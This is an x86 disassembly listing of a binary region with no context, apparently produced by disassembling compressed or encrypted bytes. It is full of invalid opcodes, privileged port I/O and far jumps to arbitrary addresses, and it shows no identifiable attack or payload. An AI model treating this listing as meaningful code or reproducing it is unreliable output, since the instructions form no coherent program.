  415ab9:	mov    eax,DWORD PTR [ebp-0x10d84b16]
  415abf:	xchg   DWORD PTR [ecx+0x63a765d3],edx
  415ac5:	test   eax,0x68d0449a
  415aca:	aas    
  415acb:	retf   0x4631
  415ace:	repnz sub esi,DWORD PTR [edi-0x2de15d3e]
  415ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ad6:	int3   
  415ad7:	aas    
  415ad8:	xor    edx,DWORD PTR [ecx+0x6917ae00]
  415ade:	pusha  
  415adf:	js     0x415a89
  415ae1:	sbb    al,0x17
  415ae3:	and    ah,BYTE PTR [esi-0x2c485dfc]
  415ae9:	xor    edx,DWORD PTR [esi+0xea627d8]
  415aef:	inc    edi
  415af0:	outs   dx,DWORD PTR ds:[esi]
  415af1:	add    DWORD PTR [edi],0xffffffbf
  415af4:	mov    eax,0x15141e0a
  415af9:	cmp    ah,bh
  415afb:	jge    0x415b4f
  415afd:	push   ds
  415afe:	test   eax,0xa80654c5
  415b03:	xchg   DWORD PTR [edi-0x26],esi
  415b06:	xor    ecx,ecx
  415b08:	xchg   ebp,eax
  415b09:	mov    esp,DWORD PTR [esi-0x4e50e297]
  415b0f:	mov    ebp,0xa555cf4d
  415b14:	es xchg bh,cl
  415b17:	lahf   
  415b18:	push   edx
  415b19:	xor    dh,cl
  415b1b:	icebp  
  415b1c:	add    ebp,edx
  415b1e:	mov    dh,0x47
  415b20:	pop    es
  415b21:	leave  
  415b22:	or     DWORD PTR fs:[esi+ebp*4-0x60f613d7],ebx
  415b2a:	xor    al,0x59
  415b2c:	xor    eax,DWORD PTR [ecx]
  415b2e:	jle    0x415b93
  415b30:	shr    DWORD PTR [edi+0x4a],cl
  415b33:	mov    ah,0xf0
  415b35:	sub    eax,DWORD PTR [edi-0x15]
  415b38:	dec    ebp
  415b39:	aad    0xf4
  415b3b:	push   ebx
  415b3c:	xchg   ecx,eax
  415b3d:	add    BYTE PTR [eax],al
  415b3f:	add    BYTE PTR [eax],al
  415b41:	add    al,al
  415b43:	push   ss
  415b44:	sbb    BYTE PTR [ebx-0x2a],0xdf
  415b48:	fistp  DWORD PTR [edi-0x239a6a81]
  415b4e:	pop    ecx
  415b4f:	pop    edi
  415b50:	add    BYTE PTR [esi+0xd96c],bl
  415b56:	repz add al,0x0
  415b59:	add    BYTE PTR [eax],ah
  415b5b:	add    DWORD PTR [edi],ebx
  415b5d:	sub    eax,0x885598
  415b62:	(bad)  
  415b63:	faddp  st(1),st
  415b65:	fsubr  DWORD PTR [edi+ecx*4+0x58]
  415b69:	mov    ebx,0xadadd2a0
  415b6e:	push   eax
  415b6f:	fsub   QWORD PTR [edi+0x4d]
  415b72:	add    DWORD PTR [edx+edi*2-0x251a70a0],esp
  415b79:	aaa    
  415b7a:	rcr    BYTE PTR [edx-0xd],0x1b
  415b7e:	and    dh,BYTE PTR [ebx+0x7f]
  415b81:	xchg   BYTE PTR [ebp-0x173af71a],dh
  415b87:	int3   
  415b88:	or     BYTE PTR [esi],cl
  415b8a:	imul   edx,DWORD PTR [eax-0x1a2cdb4],0x3c
  415b91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b92:	fist   WORD PTR [edx-0x1f]
  415b95:	adc    eax,0x1e
  415b98:	fisttp WORD PTR [edi+0x73]
  415b9b:	and    al,0x97
  415b9d:	and    al,0x5d
  415b9f:	neg    BYTE PTR ds:0x4364fe98
  415ba5:	lods   eax,DWORD PTR ds:[esi]
  415ba6:	mov    bl,0x4
  415ba8:	out    0xce,eax
  415baa:	mov    esi,0x19c6662b
  415baf:	lock jge 0x415bc9
  415bb2:	iret   
  415bb3:	or     al,0x3
  415bb5:	mov    fs,WORD PTR [bp-0x4c9d]
  415bba:	in     al,dx
  415bbb:	mov    eax,ds:0x5accfb22
  415bc0:	sbb    BYTE PTR [ebx],0x63
  415bc3:	mov    eax,0x8284a3d1
  415bc8:	xor    BYTE PTR [ebp-0x36],0x6d
  415bcc:	rcl    BYTE PTR [ebp+0x79],cl
  415bcf:	jbe    0x415ba3
  415bd1:	mov    eax,ds:0x821ee39c
  415bd6:	daa    
  415bd7:	push   es
  415bd8:	push   0x5
  415bda:	(bad)  
  415bdb:	std    
  415bdc:	pop    ss
  415bdd:	mov    ebp,0x87d924fc
  415be2:	test   DWORD PTR [eax],ecx
  415be4:	je     0x415bfb
  415be6:	inc    esp
  415be7:	es enter 0x174c,0x43
  415bec:	repz and eax,0x918415e1
  415bf2:	popf   
  415bf3:	cmp    al,0xf9
  415bf5:	xchg   esp,eax
  415bf6:	retf   
  415bf7:	xchg   edi,eax
  415bf8:	xchg   dl,ch
  415bfa:	mov    bl,0x77
  415bfc:	psubsb mm5,QWORD PTR gs:[ebx-0x23]
  415c01:	mov    al,ds:0x4aa690c5
  415c06:	popa   
  415c07:	cdq    
  415c08:	inc    eax
  415c09:	repnz outs dx,BYTE PTR ds:[esi]
  415c0b:	repnz test al,0x74
  415c0e:	cwde   
  415c0f:	inc    ecx
  415c10:	pop    ss
  415c11:	pop    edx
  415c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c13:	push   0xffffffcc
  415c15:	cdq    
  415c16:	out    0x32,al
  415c18:	sar    BYTE PTR [ebx-0x71],0xf6
  415c1c:	mov    edx,0xd041a51c
  415c21:	repz sub esi,DWORD PTR [edx-0x24]
  415c25:	jb     0x415bd3
  415c27:	in     al,0x3b
  415c29:	es inc eax
  415c2b:	call   0xe3a7:0xb2e97b14
  415c32:	fucomi st,st(6)
  415c34:	pop    ds
  415c35:	adc    DWORD PTR [edx+ecx*8+0x5f],esi
  415c39:	test   BYTE PTR [ecx],cl
  415c3b:	sbb    cl,BYTE PTR [eax]
  415c3d:	pop    ss
  415c3e:	add    al,0x3f
  415c40:	scas   eax,DWORD PTR es:[edi]
  415c41:	addr16 (bad) 
  415c43:	fs std 
  415c45:	mov    ecx,0xd4f36105
  415c4a:	sbb    ecx,ecx
  415c4c:	pop    es
  415c4d:	inc    edi
  415c4e:	mov    edi,0xb4b993ee
  415c53:	pusha  
  415c54:	es lock xadd eax,ebx
  415c59:	jno    0x415ccb
  415c5b:	push   edi
  415c5c:	xchg   ecx,eax
  415c5d:	and    eax,0x6a2757e8
  415c62:	ror    BYTE PTR [ebp+0x2],1
  415c65:	fs pushf 
  415c67:	jecxz  0x415c9d
  415c69:	js     0x415c0a
  415c6b:	dec    ecx
  415c6c:	scas   eax,DWORD PTR es:[edi]
  415c6d:	push   eax
  415c6e:	and    al,0x67
  415c70:	enter  0xe873,0xd8
  415c74:	dec    edx
  415c75:	outs   dx,DWORD PTR ds:[esi]
  415c76:	adc    BYTE PTR [edi+0x7a],0xc9
  415c7a:	xchg   esi,eax
  415c7b:	ror    DWORD PTR [ebp+0x13],0x3b
  415c7f:	sub    DWORD PTR [ecx],ecx
  415c81:	hlt    
  415c82:	repnz mov al,0xc1
  415c85:	pop    ds
  415c86:	cli    
  415c87:	aad    0x66
  415c89:	aam    0xd7
  415c8b:	pop    edx
  415c8c:	daa    
  415c8d:	add    esi,DWORD PTR [ebx-0x1e74420a]
  415c93:	and    cl,BYTE PTR [ecx+0x4b]
  415c96:	jns    0x415c37
  415c98:	arpl   WORD PTR [edx+esi*4],bp
  415c9b:	enter  0x2a97,0xa7
  415c9f:	push   ss
  415ca0:	out    0x12,al
  415ca2:	xchg   esi,eax
  415ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ca4:	dec    edi
  415ca5:	push   esi
  415ca6:	and    eax,0x6684ad28
  415cab:	sub    al,0x9d
  415cad:	inc    ebp
  415cae:	cld    
  415caf:	xchg   BYTE PTR [edx-0x49],al
  415cb2:	test   dh,ah
  415cb4:	xchg   esi,eax
  415cb5:	sub    esi,DWORD PTR [ecx+0x6e]
  415cb8:	jle    0x415cdc
  415cba:	xor    al,0xa5
  415cbc:	inc    ecx
  415cbd:	mov    dl,0x80
  415cbf:	into   
  415cc0:	nop
  415cc1:	das    
  415cc2:	cmp    DWORD PTR [ebp+0x10],edi
  415cc5:	ret    0xb655
  415cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cc9:	sub    BYTE PTR [ecx+0x535ebd72],dh
  415ccf:	push   0x33a7a7f4
  415cd4:	jns    0x415d00
  415cd6:	jp     0x415d2f
  415cd8:	and    esi,DWORD PTR [esi-0x66]
  415cdb:	std    
  415cdc:	stc    
  415cdd:	and    ebx,ebx
  415cdf:	adc    dl,BYTE PTR [edx+0x5f]
  415ce2:	pop    esp
  415ce3:	jmp    0x9f1d3139
  415ce8:	nop
  415ce9:	xor    BYTE PTR [eax],dh
  415ceb:	cmp    edx,DWORD PTR [ecx+0x17]
  415cee:	call   0x1377:0x2cf498d8
  415cf5:	in     eax,dx
  415cf6:	or     al,0x5d
  415cf8:	sub    ebx,DWORD PTR [edx]
  415cfa:	fcom   DWORD PTR [ecx+0x3c58f1e1]
  415d00:	fidiv  WORD PTR [ecx+0x61]
  415d03:	push   cs
  415d04:	push   ds
  415d05:	jo     0x415cb1
  415d07:	ret    0x396b
  415d0a:	add    edx,DWORD PTR [edi]
  415d0c:	push   ss
  415d0d:	pop    ebp
  415d0e:	or     ebx,DWORD PTR [ecx]
  415d10:	rdpmc  
  415d12:	jp     0x415d6e
  415d14:	pop    es
  415d15:	in     eax,dx
  415d16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d17:	cs loop 0x415d6b
  415d1a:	rcl    al,0xa6
  415d1d:	cmp    bl,BYTE PTR [edx+esi*2+0x2fe248dd]
  415d24:	inc    edx
  415d25:	mov    WORD PTR [ebx+0x13541c72],ds
  415d2b:	inc    ebx
  415d2c:	lock xchg ebx,eax
  415d2e:	ds retf 
  415d30:	jnp    0x415d37
  415d32:	retf   
  415d33:	lods   eax,DWORD PTR ds:[esi]
  415d34:	and    DWORD PTR [ecx],ebx
  415d36:	mov    esi,0xb3b5dfd3
  415d3b:	jbe    0x415cda
  415d3d:	mov    ?,WORD PTR [eax-0x4f]
  415d40:	sbb    edx,DWORD PTR ds:0x4b433436
  415d47:	inc    ebx
  415d48:	mov    ah,0x30
  415d4a:	loop   0x415d9a
  415d4c:	loop   0x415ce5
  415d4e:	sbb    BYTE PTR [ebx-0x564d314f],0x33
  415d55:	cmp    ah,ch
  415d57:	(bad)  
  415d58:	xchg   esp,eax
  415d59:	lea    eax,[ebx]
  415d5b:	icebp  
  415d5c:	stos   DWORD PTR es:[edi],eax
  415d5d:	imul   eax,DWORD PTR [esi],0x9466858f
  415d63:	shl    BYTE PTR [eax+0xb],cl
  415d66:	jmp    0x20ea92f2
  415d6b:	sbb    ah,BYTE PTR [ebp+edx*8-0x4a72fe4a]
  415d72:	in     al,0xc0
  415d74:	hlt    
  415d75:	dec    ebp
  415d76:	inc    ebp
  415d77:	and    al,0x8b
  415d79:	and    DWORD PTR [ebx+0x38],ebx
  415d7c:	(bad)  
  415d7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d7e:	inc    ebp
  415d7f:	stc    
  415d80:	sbb    al,0x87
  415d82:	xchg   edx,eax
  415d83:	jns    0x415d11
  415d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d86:	add    al,0x57
  415d88:	fcom   QWORD PTR ds:0x40e0b93f
  415d8e:	rcr    BYTE PTR [edx+0x21],cl
  415d91:	add    eax,0x46860c32
  415d96:	jne    0x415da1
  415d98:	dec    ebx
  415d99:	ja     0x415e1a
  415d9b:	fcomp  QWORD PTR [ebx-0xb]
  415d9e:	pop    edx
  415d9f:	mov    dh,0x2b
  415da1:	out    dx,eax
  415da2:	sbb    BYTE PTR [ebp-0x60],al
  415da5:	and    esp,esi
  415da7:	push   esi
  415da8:	out    0x61,al
  415daa:	push   ds
  415dab:	out    dx,al
  415dac:	jmp    0xc3376342
  415db1:	sar    BYTE PTR [eax+eax*1],0x27
  415db5:	inc    ecx
  415db6:	jg     0x415da8
  415db8:	pop    eax
  415db9:	xchg   esi,eax
  415dba:	xlat   BYTE PTR ds:[ebx]
  415dbb:	rep lods al,BYTE PTR ds:[esi]
  415dbd:	mov    esp,0x3587af52
  415dc2:	add    al,0x9d
  415dc4:	nop
  415dc5:	mov    DWORD PTR ds:0x606d540a,0x5f2098ea
  415dcf:	dec    edx
  415dd0:	push   esp
  415dd1:	adc    eax,0x27a3e98
  415dd6:	xchg   esp,eax
  415dd7:	nop
  415dd8:	gs ja  0x415dfd
  415ddb:	xchg   ecx,eax
  415ddc:	and    esp,DWORD PTR [eax-0x2f88a6c6]
  415de2:	sbb    BYTE PTR [eax+ebx*8-0x6f],dl
  415de6:	ins    DWORD PTR es:[edi],dx
  415de7:	lods   al,BYTE PTR ds:[esi]
  415de8:	ins    DWORD PTR es:[edi],dx
  415de9:	(bad)  
  415dea:	push   ecx
  415deb:	add    al,0x8b
  415ded:	add    eax,0xd78653d8
  415df2:	ins    BYTE PTR es:[edi],dx
  415df3:	faddp  st(4),st
  415df5:	dec    edi
  415df6:	adc    ebx,ebx
  415df8:	push   edi
  415df9:	lods   eax,DWORD PTR ds:[esi]
  415dfa:	mov    bh,0x78
  415dfc:	cmc    
  415dfd:	fcmovne st,st(4)
  415dff:	fs push 0xf2757290
  415e05:	aas    
  415e06:	cld    
  415e07:	pusha  
  415e08:	ins    DWORD PTR es:[edi],dx
  415e09:	and    BYTE PTR [edi],0xf8
  415e0c:	sub    ch,BYTE PTR [ebp+0x1c]
  415e0f:	loop   0x415e23
  415e11:	nop
  415e12:	adc    DWORD PTR [eax],esi
  415e14:	push   ebx
  415e15:	repz and bl,BYTE PTR [edx+0x52eba2a3]
  415e1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e1d:	sar    BYTE PTR [edi-0x3d192b9c],0x43
  415e24:	inc    BYTE PTR [edi-0x678bdbd6]
  415e2a:	stos   DWORD PTR es:[edi],eax
  415e2b:	pop    ecx
  415e2c:	and    al,0xea
  415e2e:	ret    
  415e2f:	dec    ebp
  415e30:	dec    edx
  415e31:	aad    0x7c
  415e33:	pop    ebp
  415e34:	dec    eax
  415e35:	push   ebx
  415e36:	push   eax
  415e37:	popa   
  415e38:	loop   0x415e9d
  415e3a:	into   
  415e3b:	fs stc 
  415e3d:	jo     0x415df7
  415e3f:	cdq    
  415e40:	cmp    eax,ecx
  415e42:	jmp    0x415eb5
  415e44:	jmp    0x8cb2:0xe659c8c7
  415e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e4c:	xchg   ebx,eax
  415e4d:	xlat   BYTE PTR ds:[ebx]
  415e4e:	jae    0x415ddc
  415e50:	adc    DWORD PTR [edx+0x2dbcb79],edx
  415e56:	lds    ecx,FWORD PTR ds:0xfb6e3cb7
  415e5c:	and    DWORD PTR [eax],edi
  415e5e:	sbb    al,BYTE PTR [edx]
  415e60:	and    bl,0x91
  415e63:	rcr    BYTE PTR [ecx-0x9],0x16
  415e67:	mov    ds:0xc7de3fd7,eax
  415e6c:	shr    BYTE PTR [edx-0x3d],1
  415e6f:	cmp    BYTE PTR [ebp+0x11],al
  415e72:	cmp    BYTE PTR [ecx+0x3fb4fb],ah
  415e78:	fisubr WORD PTR [edx]
  415e7a:	fild   DWORD PTR [ebx+0x2f8175fc]
  415e80:	mov    al,0x8d
  415e82:	inc    eax
  415e83:	fcmove st,st(3)
  415e85:	jp     0x415e6a
  415e87:	fdivr  DWORD PTR [edx+0x7a]
  415e8a:	sbb    BYTE PTR [edi+0x6ab41219],bl
  415e90:	cmc    
  415e91:	sub    DWORD PTR [ebp+0x53],ecx
  415e94:	or     bh,ch
  415e96:	je     0x415e87
  415e98:	btc    DWORD PTR [ecx-0x28d5728a],ebx
  415e9f:	jns    0x415ed7
  415ea1:	(bad)  
  415ea2:	or     al,0x7f
  415ea4:	jmp    0x415e3a
  415ea6:	test   al,0xd0
  415ea8:	mov    esp,0x29f4c9d0
  415ead:	out    0xcc,eax
  415eaf:	mov    ebp,0xa345d4b9
  415eb4:	mov    ecx,0xc5d18396
  415eb9:	scas   al,BYTE PTR es:[edi]
  415eba:	shr    BYTE PTR ss:[eax],1
  415ebd:	and    ebx,DWORD PTR [esp+esi*8+0x1043168e]
  415ec4:	stc    
  415ec5:	mov    al,0xf3
  415ec7:	or     BYTE PTR ds:0x575849cb,ah
  415ecd:	pusha  
  415ece:	out    0xa7,eax
  415ed0:	pop    edx
  415ed1:	pusha  
  415ed2:	js     0x415f19
  415ed4:	(bad)  [edi]
  415ed6:	nop
  415ed7:	in     al,0xad
  415ed9:	mov    ?,WORD PTR [esp+eiz*2]
  415edc:	inc    esp
  415edd:	inc    eax
  415ede:	ins    DWORD PTR es:[edi],dx
  415edf:	inc    ebp
  415ee0:	ror    DWORD PTR [ecx],0xac
  415ee3:	js     0x415ec2
  415ee5:	push   0x58
  415ee7:	(bad)  
  415ee8:	aam    0x15
  415eea:	sbb    eax,0x7205db6f
  415eef:	xor    BYTE PTR [ebx+0x1e422f74],0x98
  415ef6:	ja     0x415e8c
  415ef8:	push   ds
  415ef9:	dec    esi
  415efa:	adc    DWORD PTR [ebp-0x49ad1fd],eax
  415f00:	je     0x415f08
  415f02:	gs jg  0x415ee9
  415f05:	mov    ds:0xf0a29fd3,al
  415f0a:	mov    DWORD PTR [ebx],ebx
  415f0c:	addr16 (bad) 
  415f0e:	fnstsw WORD PTR [edx+0x4897519c]
  415f14:	mov    ebp,0xf7532c4e
  415f19:	xchg   ebp,eax
  415f1a:	mov    bl,0x90
  415f1c:	in     al,0x25
  415f1e:	addr16 cmc 
  415f20:	addr16 pop ecx
  415f22:	retf   0x5be6
  415f25:	aad    0xac
  415f27:	aad    0x78
  415f29:	jnp    0x415ed4
  415f2b:	xchg   esi,eax
  415f2c:	cmp    BYTE PTR [ebx],ch
  415f2e:	sar    esp,0x12
  415f31:	sar    ecx,cl
  415f33:	loope  0x415ef2
  415f35:	or     BYTE PTR [esi],dh
  415f37:	or     BYTE PTR [ebp-0x25],ah
  415f3a:	dec    ebp
  415f3b:	nop
  415f3c:	dec    eax
  415f3d:	push   ecx
  415f3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f3f:	push   edx
  415f40:	push   ebx
  415f41:	mov    edi,0xf59e5626
  415f46:	outs   dx,DWORD PTR ds:[esi]
  415f47:	inc    eax
  415f48:	cdq    
  415f49:	in     eax,dx
  415f4a:	sbb    eax,0x6cffa869
  415f4f:	mov    ?,WORD PTR [edx-0x47]
  415f52:	jns    0x415faa
  415f54:	mov    al,BYTE PTR [edx-0x1de73517]
  415f5a:	jo     0x415f95
  415f5c:	mov    esp,0xbc7b63f6
  415f61:	in     al,0x80
  415f63:	xchg   ebx,eax
  415f64:	test   al,0x21
  415f66:	xchg   esp,eax
  415f67:	mov    ds:0x647231a0,eax
  415f6c:	outs   dx,BYTE PTR ds:[esi]
  415f6d:	or     bl,BYTE PTR [edi+eax*8-0x4c]
  415f71:	mov    ebx,0x5da027af
  415f76:	sbb    bl,al
  415f78:	mov    dl,0xb
  415f7a:	fisttp QWORD PTR ds:0xa8eeaa82
  415f80:	js     0x415f6f
  415f82:	pop    ecx
  415f83:	popa   
  415f84:	or     eax,DWORD PTR [esi]
  415f86:	add    eax,0xfd611d00
  415f8b:	cld    
  415f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f8d:	gs dec ecx
  415f8f:	add    eax,DWORD PTR [eax]
  415f91:	mov    dh,0x9e
  415f93:	add    al,0x6a
  415f95:	and    edi,ebp
  415f97:	in     eax,0xf9
  415f99:	cmp    cl,BYTE PTR ds:0x648d7aec
  415f9f:	or     cl,BYTE PTR [ebp+0x74e21a47]
  415fa5:	cmp    eax,0x643c9b57
  415faa:	push   esi
  415fab:	jmp    0xf31c6835
  415fb0:	mov    gs,esp
  415fb2:	inc    eax
  415fb3:	xor    eax,DWORD PTR [edx-0xfc61a39]
  415fb9:	push   esp
  415fba:	ret    0x580
  415fbd:	out    0xc8,eax
  415fbf:	inc    ecx
  415fc0:	sub    bl,BYTE PTR [eax+0x188ae753]
  415fc6:	jno    0x415fba
  415fc8:	dec    eax
  415fc9:	mov    dh,0xb8
  415fcb:	int3   
  415fcc:	adc    eax,0x802f2058
  415fd1:	sub    DWORD PTR [ebx+0x793451ce],0x5832890
  415fdb:	popa   
  415fdc:	dec    edi
  415fdd:	ins    BYTE PTR es:[edi],dx
  415fde:	fs sub ebp,esp
  415fe1:	mov    esi,0x82c1fae9
  415fe6:	jne    0x415f76
  415fe8:	lea    eax,[edi]
  415fea:	lea    esi,[edx+0x7f]
  415fed:	mov    esi,0x7d43f51f
  415ff2:	ins    BYTE PTR es:[edi],dx
  415ff3:	sub    BYTE PTR [esi+ecx*4-0x6366b8e1],0x48
  415ffb:	and    ebx,DWORD PTR [ebp-0x5d]
  415ffe:	sub    DWORD PTR [ebp+0x60],esp
  416001:	retf   0x238
  416004:	aad    0x0
  416006:	ror    ch,1
  416008:	pusha  
  416009:	arpl   WORD PTR [ebx-0x57],ax
  41600c:	shl    BYTE PTR [ebx-0x61e069cd],1
  416012:	xor    BYTE PTR [edi-0x384e349],0x3e
  416019:	loopne 0x416068
  41601b:	push   eax
  41601c:	sub    DWORD PTR [edx],esp
  41601e:	imul   edx,DWORD PTR [eax+0x65ff63c3],0x3f
  416025:	sub    eax,0x7bf5cb0f
  41602a:	inc    ebx
  41602b:	rcl    DWORD PTR [edi+0x8],1
  41602e:	idiv   BYTE PTR [ebp-0x12c77d0a]
  416034:	nop
  416035:	push   0xf4200938
  41603a:	imul   esi,ebp,0xa7f31869
  416040:	ss jb  0x416013
  416043:	mov    ah,0xc0
  416045:	jp     0x416031
  416047:	push   eax
  416048:	sub    al,0x7b
  41604a:	scas   eax,DWORD PTR es:[edi]
  41604b:	arpl   WORD PTR ds:0x0,sp
  416051:	add    BYTE PTR [edx],bh
  416053:	jne    0x416091
  416055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416056:	jg     0x416047
  416058:	mov    edx,0xd72f5cfd
  41605d:	jae    0x415fee
  41605f:	push   eax
  416060:	mov    dh,0xe9
  416062:	pop    edi
  416063:	fiadd  WORD PTR [eax]
  416065:	add    bl,dh
  416067:	add    al,0x0
  416069:	add    dh,bh
  41606b:	add    eax,DWORD PTR [ecx]
  41606d:	mov    ds:0x94eca6d8,eax
  416072:	or     ebp,esp
  416074:	mov    dh,BYTE PTR [esi-0x1ed676ad]
  41607a:	cwde   
  41607b:	fild   QWORD PTR [edi-0x37a68b94]
  416081:	inc    ebx
  416082:	adc    al,0xfb
  416084:	mov    dh,0xc5
  416086:	(bad)  
  416087:	xlat   BYTE PTR ds:[ebx]
  416088:	sbb    eax,ebx
  41608a:	add    BYTE PTR [eax-0x7b],al
  41608d:	xor    DWORD PTR [ecx],esp
  41608f:	clc    
  416090:	ret    0x9a8
  416093:	xchg   ecx,eax
  416094:	scas   al,BYTE PTR es:[edi]
  416095:	mov    ah,0xf6
  416097:	outs   dx,BYTE PTR ds:[esi]
  416098:	shl    DWORD PTR [eax+0x35338496],1
  41609e:	jmp    0x8abe01e5
  4160a3:	fsubr  DWORD PTR [esi+0x4d]
  4160a6:	mov    ebx,0x2b1cfe0f
  4160ab:	ja     0x41608b
  4160ad:	imul   eax,DWORD PTR [ebp-0x13],0xdc4f18c6
  4160b4:	(bad)  
  4160b5:	pop    ebp
  4160b6:	call   0x35d4:0x611a9e48
  4160bd:	jg     0x4160ae
  4160bf:	add    BYTE PTR [ecx],cl
  4160c1:	sbb    al,0x4f
  4160c3:	hlt    
  4160c4:	rcl    BYTE PTR [edx],cl
  4160c6:	pop    esp
  4160c7:	mov    ebx,0x780667c3
  4160cc:	aaa    
  4160cd:	sbb    BYTE PTR [edi*8-0x71e5e3ee],ch
  4160d4:	(bad)  
  4160d5:	into   
  4160d6:	idiv   DWORD PTR [ecx-0x51]
  4160d9:	inc    esp
  4160da:	test   DWORD PTR [edx],0xe2b5c89f
  4160e0:	mov    ebp,0xded486ba
  4160e5:	lds    edi,FWORD PTR ds:0x6211015
  4160eb:	push   ss
  4160ec:	cdq    
  4160ed:	not    BYTE PTR [di]
  4160f0:	cli    
  4160f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160f2:	in     al,0xf2
  4160f4:	pop    esp
  4160f5:	cmc    
  4160f6:	adc    al,0xc6
  4160f8:	dec    edi
  4160f9:	sar    BYTE PTR [ebx],1
  4160fb:	or     edi,esp
  4160fd:	mov    edi,0xd48818cc
  416102:	into   
  416103:	push   eax
  416104:	push   edi
  416105:	dec    ecx
  416106:	js     0x4160e9
  416108:	sbb    ch,al
  41610a:	sar    BYTE PTR [edx],1
  41610c:	xor    esp,DWORD PTR [esi]
  41610e:	in     eax,0x65
  416110:	fs push eax
  416112:	ins    DWORD PTR es:[edi],dx
  416113:	mov    esi,0x1ad93f5
  416118:	and    BYTE PTR [ebp+0x6e],dh
  41611b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41611c:	mov    al,0xdc
  41611e:	adc    BYTE PTR [ebx],dl
  416120:	jle    0x41615e
  416122:	addr16 sub eax,0xfd04b5a0
  416128:	mov    ah,0xd9
  41612a:	rcr    DWORD PTR [eax],1
  41612c:	test   BYTE PTR [ebp+0x1bb03ded],al
  416132:	sub    esp,ecx
  416134:	imul   edx,DWORD PTR [ebp*2-0x6d528a07],0x42
  41613c:	xchg   esp,eax
  41613d:	mov    esp,0x61a748e1
  416142:	sub    ebp,edi
  416144:	mov    ebx,0x91505e8f
  416149:	dec    ebx
  41614a:	in     eax,0xe7
  41614c:	sub    dl,BYTE PTR [eax+esi*8]
  41614f:	pop    esi
  416150:	mov    dh,BYTE PTR [esi-0x6a32e14c]
  416156:	scas   al,BYTE PTR es:[edi]
  416157:	in     eax,0x41
  416159:	sbb    al,0xc3
  41615b:	mov    cl,0x9a
  41615d:	xchg   ecx,eax
  41615e:	jns    0x41618c
  416160:	dec    edx
  416161:	sub    ecx,DWORD PTR [edx]
  416163:	jle    0x4161c7
  416165:	dec    esp
  416166:	repnz pop es
  416168:	or     eax,0xf9319d1a
  41616d:	fst    QWORD PTR [ecx-0x4172f03e]
  416173:	or     al,0x9d
  416175:	inc    DWORD PTR [ecx+0x38]
  416178:	sub    ebp,DWORD PTR [esi+0x7e]
  41617b:	or     BYTE PTR [ebp-0x44],cl
  41617e:	mov    ds:0x68719e09,al
  416183:	sub    cl,BYTE PTR [edi+0x7100894a]
  416189:	inc    esp
  41618a:	add    BYTE PTR [eax+0xc5dc69a],dl
  416190:	mov    BYTE PTR [ebx],cl
  416192:	add    ebx,ebp
  416194:	aas    
  416195:	repnz ins DWORD PTR es:[edi],dx
  416197:	mov    ch,0xc2
  416199:	xor    esi,esp
  41619b:	scas   al,BYTE PTR es:[edi]
  41619c:	jl     0x41611e
  41619e:	test   eax,0x96df7668
  4161a3:	ss dec ebx
  4161a5:	cmp    BYTE PTR [ebp+edi*2+0x41acfc43],bl
  4161ac:	jmp    0xcd19:0x5deed463
  4161b3:	add    esi,esp
  4161b5:	out    0xe9,eax
  4161b7:	(bad)  
  4161b8:	xchg   ebp,eax
  4161b9:	aaa    
  4161ba:	dec    esp
  4161bb:	sub    eax,0xcfbc1ab4
  4161c0:	icebp  
  4161c1:	xchg   esp,eax
  4161c2:	mov    fs,WORD PTR [edi]
  4161c4:	xlat   BYTE PTR ds:[ebx]
  4161c5:	sub    DWORD PTR [esi],0xb94095c
  4161cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161cc:	mov    ch,0x34
  4161ce:	sti    
  4161cf:	or     ah,dh
  4161d1:	loope  0x4161f5
  4161d3:	je     0x4161c9
  4161d5:	add    BYTE PTR [edi-0x6db2427a],cl
  4161db:	push   edx
  4161dc:	icebp  
  4161dd:	lods   al,BYTE PTR ds:[esi]
  4161de:	(bad)  
  4161df:	adc    ecx,DWORD PTR [ebx-0x5c13718f]
  4161e5:	lods   al,BYTE PTR ds:[esi]
  4161e6:	adc    BYTE PTR [ebx-0x5c458f59],bl
  4161ec:	xchg   BYTE PTR [edi],bl
  4161ee:	push   0xffffff8f
  4161f0:	and    ebx,ebx
  4161f2:	inc    eax
  4161f3:	cmp    ebx,DWORD PTR [ecx+0x23]
  4161f6:	push   es
  4161f7:	ss mov dl,0x54
  4161fa:	add    DWORD PTR [ebx+esi*4+0x72],edi
  4161fe:	scas   al,BYTE PTR es:[edi]
  4161ff:	fstp   DWORD PTR [ebx]
  416201:	ins    BYTE PTR es:[edi],dx
  416202:	std    
  416203:	add    al,BYTE PTR [ebp+0x27]
  416206:	push   es
  416207:	ins    DWORD PTR es:[edi],dx
  416208:	imul   ecx,DWORD PTR [edi+0xf65ad97],0xc4ab8197
  416212:	(bad)  
  416213:	dec    esp
  416214:	mov    dl,0x13
  416216:	jnp    0x4161cc
  416218:	mov    cs,WORD PTR [eax]
  41621a:	retf   
  41621b:	jnp    0x4161ca
  41621d:	add    ecx,DWORD PTR ds:0x67fef049
  416223:	dec    esi
  416224:	jl     0x41629c
  416226:	js     0x4161be
  416228:	jno    0x416206
  41622a:	cli    
  41622b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41622c:	or     DWORD PTR [ecx-0x22],edi
  41622f:	ds jecxz 0x41623a
  416232:	aad    0x80
  416234:	ret    0x5b4d
  416237:	add    DWORD PTR [esi+eiz*4+0x6e],edx
  41623b:	cdq    
  41623c:	test   al,0xe8
  41623e:	add    ah,dl
  416240:	or     bh,BYTE PTR [eax+0x569357cb]
  416246:	scas   al,BYTE PTR es:[edi]
  416247:	call   0xdd1b:0x2a26c213
  41624e:	inc    ebp
